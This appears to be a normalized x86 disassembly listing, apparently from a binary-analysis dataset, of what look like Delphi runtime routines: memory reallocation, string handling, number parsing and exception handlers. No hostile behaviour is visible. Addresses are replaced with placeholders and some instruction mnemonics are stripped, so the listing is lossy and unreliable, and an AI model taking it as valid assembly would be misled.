call sub_401ba0
sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026a9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405be4
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405be4
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405be4
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405be4
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_402944
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402998
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_4029f0
push esi
push edi
mov edi eax
xor eax eax
mov al [ edi ]
mov esi edx
xor edx edx
mov dl [ esi ]
inc esi
add al dl
jb r-xdata
mov al cl
sub cl [ edi ]
jbe r-xdata
cmp al cl
ja r-xdata
pop edi
pop esi
retn
mov dl cl
jmp r-xdata
mov ecx edx
mov dl [ edi ]
mov [ edi ] al
inc edi
add edi edx
[ edi ] [ esi ]
sub_402a2c
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402a48
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402acc
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402b3c
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402b5c
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402c3c
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402c7c
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d2f ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402d2f ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402d2f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_402f68
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_402f98
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403009
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_40308c
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403134
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_40318c
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4048a8
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4031ac
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4054cc
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_4031dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403260
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_403270
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403267
lea eax [ ebp - 0x8 ]
call sub_4054b4
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4031ac
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4054cc
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_403270
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4032b4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403354
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4032f4
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403324
push eax
push ecx
mov eax [ eax ]
call sub_4032f4
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e6c
call [ rw-data ]
sub_40333c
push esi
mov esi edx
mov eax [ eax ]
call sub_4032f4
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403e6c
call [ rw-data ]
sub_403384
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4032f4
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4033ac
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_4033fc
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_40344c
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_403475
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4034e0
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_40351c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403530
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403544
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403564
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403544
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4035c8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_40305c
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405be4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403530
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4034e0
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_4036f4
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_40305c
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4034e0
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405be4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_40351c
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402acc
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_40387c
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403564
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4038b4
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_403e6c
sub_4038dc
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_405be4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403128
call sub_4034c4
sub_403930
call sub_405be4
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403128
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_40358c
jmp edx
sub_403978
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4027c0
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
